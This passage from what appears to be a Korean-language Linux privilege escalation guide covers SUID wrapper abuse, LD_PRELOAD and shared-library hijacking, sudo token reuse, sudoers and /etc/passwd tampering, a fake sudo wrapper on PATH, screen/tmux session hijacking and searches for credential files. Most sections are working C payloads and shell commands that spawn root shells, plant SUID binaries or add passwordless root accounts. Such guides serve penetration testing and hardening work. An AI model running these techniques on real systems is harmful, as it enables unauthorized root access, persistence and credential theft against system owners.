export -f /usr/sbin/service
```
그런 다음 SUID binary를 호출하면 이 함수가 실행됩니다.

### SUID wrapper가 실행하는 쓰기 가능한 script

일반적인 custom-app 설정 오류는 script를 실행하는 root 소유의 SUID binary wrapper이며, 해당 script 자체는 권한이 낮은 사용자가 수정할 수 있는 경우입니다.

일반적인 패턴:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh`에 쓰기 권한이 있다면 payload 명령을 추가한 다음 SUID wrapper를 실행할 수 있습니다:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
빠른 점검:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
이 공격 경로는 `/usr/local/bin`에 제공되는 `"maintenance"`/`"backup"` wrappers에서 특히 흔합니다.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 다른 모든 shared library(.so 파일)보다 먼저 로더가 로드할 하나 이상의 shared library를 지정하는 데 사용됩니다. 여기에는 표준 C 라이브러리(`libc.so`)도 포함됩니다. 이 과정을 library preloading이라고 합니다.

그러나 시스템 보안을 유지하고 이 기능이 악용되는 것을 방지하기 위해, 특히 **suid/sgid** executable에 대해 시스템은 다음 조건을 적용합니다:

- real user ID (_ruid_)가 effective user ID (_euid_)와 일치하지 않는 executable에서는 로더가 **LD_PRELOAD**를 무시합니다.
- suid/sgid executable의 경우 standard path에 있으며 동시에 suid/sgid인 library만 preload됩니다.

`sudo`로 command를 실행할 수 있고 `sudo -l`의 출력에 **env_keep+=LD_PRELOAD** 문이 포함되어 있다면 privilege escalation이 발생할 수 있습니다. 이 configuration은 `sudo`로 command를 실행할 때도 **LD_PRELOAD** 환경 변수가 유지되고 인식되도록 하며, 잠재적으로 elevated privileges로 arbitrary code를 실행할 수 있게 합니다.
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c로 저장**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 다음을 사용하여 **compile it**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, **escalate privileges**를 실행합니다.
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 공격자가 **LD_LIBRARY_PATH** env variable을 제어하는 경우에도 유사한 privesc가 악용될 수 있습니다. 공격자가 libraries를 검색할 path를 제어하기 때문입니다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** 권한이 설정된 바이너리가 특이해 보일 때는 **.so** 파일을 정상적으로 로드하는지 확인하는 것이 좋습니다. 다음 명령을 실행하여 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_와 같은 오류가 발생하면 exploitation 가능성이 있음을 나타냅니다.

이를 exploitation하려면 먼저 _"/path/to/.config/libcalc.c"_와 같은 C file을 생성하고 다음 code를 포함합니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일하고 실행하면 파일 권한을 조작하고 권한이 상승된 셸을 실행하여 권한을 상승시키는 것을 목표로 합니다.

다음 명령어를 사용하여 위의 C 파일을 shared object(.so) 파일로 컴파일합니다:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받는 SUID binary를 실행하면 exploit이 트리거되어 시스템이 잠재적으로 손상될 수 있습니다.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
이제 우리가 쓸 수 있는 폴더에서 library를 로드하는 SUID binary를 찾았으므로, 필요한 이름으로 해당 폴더에 library를 생성해 보겠습니다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
다음과 같은 오류가 발생하면
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
즉, 생성한 library에는 `a_function_name`이라는 function이 있어야 합니다.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io)는 attacker가 local security restrictions를 우회하는 데 악용할 수 있는 Unix binary를 선별해 정리한 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/)는 command에 **argument만 inject할 수 있는** 경우를 위한 동일한 목록입니다.

이 project는 restricted shell에서 탈출하거나, elevated privilege를 얻거나 유지하거나, file을 전송하거나, bind 및 reverse shell을 생성하거나, 기타 post-exploitation 작업을 수행하는 데 악용할 수 있는 Unix binary의 legitimate function을 수집합니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l`에 access할 수 있다면 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo)를 사용하여 어떤 sudo rule을 exploit할 방법을 찾는지 확인할 수 있습니다.

### Sudo Token 재사용

**sudo access는 있지만** password가 없는 경우, **sudo command 실행을 기다린 다음 session token을 hijack하여** privilege를 escalate할 수 있습니다.

Privilege escalation을 위한 requirements:

- 이미 "_sampleuser_" 사용자로 shell을 가지고 있어야 합니다.
- "_sampleuser_"가 **최근 15분 이내에 `sudo`를 사용하여** 무언가를 실행했어야 합니다. (기본적으로 이는 password를 다시 입력하지 않고 `sudo`를 사용할 수 있도록 하는 sudo token의 유효 기간입니다.)
- `cat /proc/sys/kernel/yama/ptrace_scope`의 값이 0이어야 합니다.
- `gdb`에 access할 수 있어야 합니다. (upload할 수 있어야 합니다.)

(`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`를 사용하여 `ptrace_scope`를 일시적으로 enable하거나, `/etc/sysctl.d/10-ptrace.conf`를 영구적으로 수정하고 `kernel.yama.ptrace_scope = 0`으로 설정할 수 있습니다.)

이러한 requirements가 모두 충족되면 **다음을 사용하여 privilege를 escalate할 수 있습니다:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **첫 번째 exploit** (`exploit.sh`)은 _/tmp_에 `activate_sudo_token` binary를 생성합니다. 이를 사용하여 **session에서 sudo token을 activate할 수 있습니다** (자동으로 root shell을 얻게 되지는 않으므로 `sudo su`를 실행해야 합니다):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **두 번째 exploit** (`exploit_v2.sh`)은 _/tmp_에 **root가 소유하고 setuid가 설정된** sh shell을 생성합니다.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **세 번째 exploit**(`exploit_v3.sh`)은 **sudo 토큰을 영구적으로 만들고 모든 사용자가 sudo를 사용할 수 있도록 하는 sudoers 파일을 생성합니다**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

폴더 또는 폴더 내부에 생성된 파일 중 하나에 **write permissions**이 있다면 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary를 사용하여 **사용자와 PID에 대한 sudo token을 생성**할 수 있습니다.\
예를 들어, _/var/run/sudo/ts/sampleuser_ 파일을 덮어쓸 수 있고 해당 사용자로 PID 1234의 shell을 보유하고 있다면, 다음을 실행하여 password를 알 필요 없이 **sudo privileges를 획득**할 수 있습니다:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` 파일과 `/etc/sudoers.d` 내부의 파일은 누가 `sudo`를 어떤 방식으로 사용할 수 있는지 구성합니다. 이 파일들은 **기본적으로 root 사용자와 root 그룹만 읽을 수 있습니다**.\
**이** 파일을 **읽을** 수 있다면 **몇 가지 흥미로운 정보를 얻을 수 있으며**, 어떤 파일이든 **쓸** 수 있다면 **권한을 상승**시킬 수 있습니다.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
작성할 수 있다면 이 권한을 악용할 수 있습니다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이러한 권한을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD용 `doas`와 같이 `sudo` binary의 대안이 있으며, `/etc/doas.conf`에서 해당 설정을 확인해야 합니다.
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
`doas`가 editor 또는 interpreter를 허용하는 경우 GTFOBins 스타일의 escape를 확인하세요:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

**사용자가 일반적으로 머신에 연결한 후 `sudo`를 사용해 권한을 상승시킨다는 사실을 알고 있고**, 해당 사용자 컨텍스트 내에서 셸을 획득했다면, **root 권한으로 코드를 실행한 다음 사용자의 명령을 실행하는 새로운 sudo executable**을 만들 수 있습니다. 그런 다음 사용자 컨텍스트의 **$PATH**를 수정합니다(예: `.bash_profile`에 새 경로 추가). 이렇게 하면 사용자가 sudo를 실행할 때 공격자가 만든 sudo executable이 실행됩니다.

사용자가 다른 셸(bash가 아닌 셸)을 사용하는 경우 새 경로를 추가하려면 다른 파일을 수정해야 합니다. 예를 들어 [sudo-piggyback](https://github.com/APTy/sudo-piggyback)는 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`을 수정합니다. [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)에서 또 다른 예시를 확인할 수 있습니다.

또는 다음과 유사한 명령을 실행할 수 있습니다:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

파일 `/etc/ld.so.conf`는 **로드된 configuration 파일의 출처를 나타냅니다**. 일반적으로 이 파일에는 다음 경로가 포함되어 있습니다: `include /etc/ld.so.conf.d/*.conf`

이는 `/etc/ld.so.conf.d/*.conf`의 configuration 파일이 읽힌다는 의미입니다. 이 configuration 파일은 **libraries가 있는 다른 폴더를 가리키며**, 해당 폴더에서 **libraries를 검색**합니다. 예를 들어 `/etc/ld.so.conf.d/libc.conf`의 내용은 `/usr/local/lib`입니다. **이는 시스템이 `/usr/local/lib` 내부에서 libraries를 검색한다는 의미입니다**.

어떤 이유로든 **user가** 다음 경로 중 하나에 **write 권한을 가지고 있다면**: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 내부의 모든 파일 또는 `/etc/ld.so.conf.d/*.conf` 내부의 configuration 파일에 지정된 모든 폴더에서 privileges를 escalate할 수 있습니다.\
다음 페이지에서 **이 misconfiguration을 exploit하는 방법**을 확인하세요:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib를 `/var/tmp/flag15/`에 복사하면 `RPATH` 변수에 지정된 대로 이 위치의 프로그램에서 해당 lib를 사용합니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그런 다음 `/var/tmp`에 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`를 사용하여 악성 라이브러리를 생성합니다.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities는 **프로세스에 사용 가능한 root privileges의 일부를 제공**합니다. 이는 사실상 root **privileges를 더 작고 서로 구분되는 단위로 나눕니다**. 그런 다음 각 단위를 프로세스에 독립적으로 부여할 수 있습니다. 이를 통해 전체 privileges 집합을 줄여 exploitation의 위험을 낮출 수 있습니다.\
다음 페이지를 읽고 **capabilities와 이를 abuse하는 방법에 대해 자세히 알아보세요**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

Directory에서 **"execute" bit**는 해당 사용자가 해당 폴더로 "**cd**"할 수 있음을 의미합니다.\
**"read" bit**는 사용자가 **files**를 **list**할 수 있음을 의미하고, **"write" bit**는 사용자가 새로운 **files**를 **delete**하고 **create**할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 discretionary permissions의 보조 계층으로, **기존 ugo/rwx permissions를 override할 수 있습니다**. 이러한 permissions는 소유자가 아니거나 해당 group에 속하지 않은 특정 사용자에게 rights를 허용하거나 거부할 수 있도록 하여 file 또는 directory access에 대한 제어를 강화합니다. 이 수준의 **granularity는 더욱 정밀한 access management를 보장합니다**. 자세한 내용은 [**여기**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인할 수 있습니다.

**Give** user "kali" read 및 write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**시스템에서 특정 ACL이 설정된 파일 가져오기**:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-in의 숨겨진 ACL backdoor

일반적인 잘못된 설정은 `/etc/sudoers.d/`에 `440` 모드인 root 소유 파일이 있지만, ACL을 통해 low-priv user에게 여전히 쓰기 권한을 부여하는 것입니다.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
`user:alice:rw-`와 같은 항목이 보이면, 해당 사용자는 제한적인 mode bits에도 불구하고 sudo rule을 추가할 수 있습니다:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
이는 `ls -l`만을 사용하는 검토에서 쉽게 놓칠 수 있기 때문에 영향도가 큰 ACL persistence/privesc 경로입니다.

## Open shell sessions

**old versions**에서는 다른 사용자의 (**root**) **shell** 세션을 일부 **hijack**할 수 있습니다.\
**newest versions**에서는 자신의 **user** 세션에 대해서만 screen 세션에 **connect**할 수 있습니다. 그러나 **session 내부에서 interesting information**을 찾을 수도 있습니다.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket locations (일부 시스템에서는 한쪽이 다른 쪽의 symlink로 노출됨): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**세션에 연결**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

이는 **old tmux versions**에서 발생하던 문제입니다. 권한이 없는 사용자로서 root가 생성한 tmux (v2.1) 세션을 hijack할 수 없었습니다.

**tmux 세션 나열**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket 위치 (일부 시스템에서는 한쪽이 다른 쪽의 symlink로 노출됨) - tmux sessions hijacking: tmux -S /tmp/dev sess ls 해당 socket을 사용하여 목록을 표시하고, 해당 socket에서 tmux session을 시작할 수 있습니다...](<../../images/image (837).png>)

**session에 attach**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB**를 예시로 확인하세요.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006년 9월부터 2008년 5월 13일 사이에 Debian 기반 시스템(Ubuntu, Kubuntu 등)에서 생성된 모든 SSL 및 SSH 키는 이 버그의 영향을 받을 수 있습니다.\
이 버그는 해당 OS에서 새로운 ssh key를 생성할 때 발생하며, **가능한 변형이 32,768개뿐이었습니다**. 이는 모든 가능성을 계산할 수 있으며, **ssh public key가 있으면 이에 대응하는 private key를 검색할 수 있음**을 의미합니다. 계산된 가능성은 여기에서 확인할 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** password authentication 허용 여부를 지정합니다. 기본값은 `no`입니다.
- **PubkeyAuthentication:** public key authentication 허용 여부를 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: password authentication이 허용된 경우, 서버가 빈 password 문자열을 사용하는 계정의 로그인을 허용할지 지정합니다. 기본값은 `no`입니다.

### Login control files

이 파일들은 누가 로그인할 수 있는지와 로그인 방식을 제어합니다:

- **`/etc/nologin`**: 존재하면 non-root 로그인을 차단하고 해당 메시지를 출력합니다.
- **`/etc/securetty`**: root가 로그인할 수 있는 위치를 제한합니다(TTY allowlist).
- **`/etc/motd`**: 로그인 후 표시되는 banner입니다(environment 또는 maintenance 세부 정보가 leak될 수 있습니다).

### PermitRootLogin

root가 ssh를 사용해 로그인할 수 있는지 지정하며, 기본값은 `no`입니다. 가능한 값은 다음과 같습니다:

- `yes`: root가 password와 private key를 사용해 로그인할 수 있습니다.
- `without-password` 또는 `prohibit-password`: root가 private key로만 로그인할 수 있습니다.
- `forced-commands-only`: Root는 private key를 사용하고 commands options가 지정된 경우에만 로그인할 수 있습니다.
- `no` : 로그인할 수 없습니다.

### AuthorizedKeysFile

user authentication에 사용할 수 있는 public key가 포함된 파일을 지정합니다. 홈 디렉터리로 대체되는 `%h`와 같은 token을 포함할 수 있습니다. **absolute path**(`/`로 시작) 또는 **사용자 홈 디렉터리를 기준으로 한 relative path**를 지정할 수 있습니다. 예:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
해당 설정은 "**testusername**" 사용자의 **private** key로 로그인하려고 하면, ssh가 해당 key의 public key를 `/home/testusername/.ssh/authorized_keys` 및 `/home/testusername/access`에 있는 key와 비교한다는 것을 의미합니다.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding을 사용하면 서버에 **key를 남겨 두지 않고** (passphrase가 없는 key!) **로컬 SSH key를 사용할 수 있습니다**. 따라서 ssh를 통해 **한 host로 이동한** 다음, **초기 host**에 있는 **key를 사용하여** 그곳에서 **다른 host로 이동**할 수 있습니다.

이 옵션을 `$HOME/.ssh.config`에 다음과 같이 설정해야 합니다:
```
Host example.com
ForwardAgent yes
```
`Host`가 `*`인 경우 사용자가 다른 machine으로 이동할 때마다 해당 host가 keys에 access할 수 있다는 점에 유의해야 합니다(이는 security issue입니다).

`/etc/ssh_config` 파일은 이 **options**를 **override**하여 이 configuration을 허용하거나 거부할 수 있습니다.\
`/etc/sshd_config` 파일은 `AllowAgentForwarding` keyword를 사용하여 ssh-agent forwarding을 **allow**하거나 **deny**할 수 있습니다(default는 allow).

환경에 Forward Agent가 구성되어 있다면 다음 페이지를 확인하세요. **이를 abuse하여 privileges를 escalate할 수 있을 수 있습니다**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

`/etc/profile` 파일과 `/etc/profile.d/` 아래의 파일들은 **user가 새 shell을 실행할 때 실행되는 scripts**입니다. 따라서 **이 중 하나라도 write하거나 modify할 수 있다면 privileges를 escalate할 수 있습니다**.
```bash
ls -l /etc/profile /etc/profile.d/
```
어떤 이상한 profile script가 발견되면 **sensitive details**가 있는지 확인해야 합니다.

### Passwd/Shadow 파일

OS에 따라 `/etc/passwd` 및 `/etc/shadow` 파일이 다른 이름을 사용하거나 백업 파일이 있을 수 있습니다. 따라서 **모든 파일을 찾고**, 파일을 **읽을 수 있는지 확인하여** 파일 내부에 **해시가 있는지** 확인하는 것이 좋습니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
어떤 경우에는 `/etc/passwd`(또는 이에 상응하는) 파일에서 **password hashes**를 찾을 수 있습니다
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 쓰기 가능한 /etc/passwd

먼저 다음 명령 중 하나를 사용하여 비밀번호를 생성합니다.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
그런 다음 사용자 `hacker`를 추가하고 생성된 비밀번호를 설정합니다.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `hacker:hacker`를 사용하여 `su` 명령을 실행할 수 있습니다.

또는 다음 줄을 사용하여 비밀번호가 없는 더미 사용자를 추가할 수 있습니다.\
WARNING: 현재 시스템의 보안 수준이 저하될 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 있으며, `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경되어 있습니다.

일부 **민감한 파일에 쓸 수 있는지** 확인해야 합니다. 예를 들어, 일부 **service configuration file**에 쓸 수 있나요?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어 시스템에서 **tomcat** 서버가 실행 중이고 **/etc/systemd/ 내부의 Tomcat service configuration file을 수정할 수 있다면**, 다음 줄을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
다음에 tomcat이 시작될 때 backdoor가 실행됩니다.

### 폴더 확인

다음 폴더에 backup 또는 흥미로운 정보가 있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (마지막 폴더는 읽을 수 없을 가능성이 높지만 시도해 보세요.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/소유 파일
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 최근 몇 분 내에 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨김 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 내 Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 비밀번호가 포함된 것으로 알려진 파일

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)의 코드를 확인해 보세요. **비밀번호가 포함되어 있을 가능성이 있는 여러 파일**을 검색합니다.\
이를 위해 사용할 수 있는 **또 다른 유용한 tool**은 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)입니다. LaZagne은 Windows, Linux 및 Mac의 로컬 컴퓨터에 저장된 다양한 비밀번호를 가져오는 데 사용되는 open source 애플리케이션입니다.

### 로그

로그를 읽을 수 있다면 **로그 내부에서 흥미롭거나 기밀인 정보를** 찾을 수 있을 것입니다. 로그가 더 이상할수록 더 흥미로운 정보일 가능성이 높습니다.\
또한 일부 "**잘못** 구성된(backdoored?) **audit logs**는 [이 글](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)에서 설명하는 것처럼 **audit logs** 내부에 비밀번호를 **기록하도록** 할 수도 있습니다.
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
로그를 **읽으려면** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **그룹**이 매우 유용합니다.

### Shell 파일
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

또한 **이름**이나 **내용**에 "**password**"라는 단어가 포함된 파일을 확인하고, 로그 내부의 IP와 이메일 또는 hashes regexps도 확인해야 합니다.\
이 모든 작업을 수행하는 방법을 여기에서 전부 나열하지는 않겠지만, 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 검사 항목을 확인할 수 있습니다.

## Writable files

### Python library hijacking

Python 스크립트가 **어디에서** 실행될지 알고 있고 해당 폴더에 **write inside**할 수 있거나 **Python libraries를 수정**할 수 있다면, OS library를 수정하여 backdoor로 만들 수 있습니다(Python 스크립트가 실행될 위치에 write할 수 있다면 os.py library를 복사하여 붙여 넣습니다).

**library를 backdoor로 만들려면** os.py library 끝에 다음 줄을 추가합니다(IP와 PORT를 변경).
```python
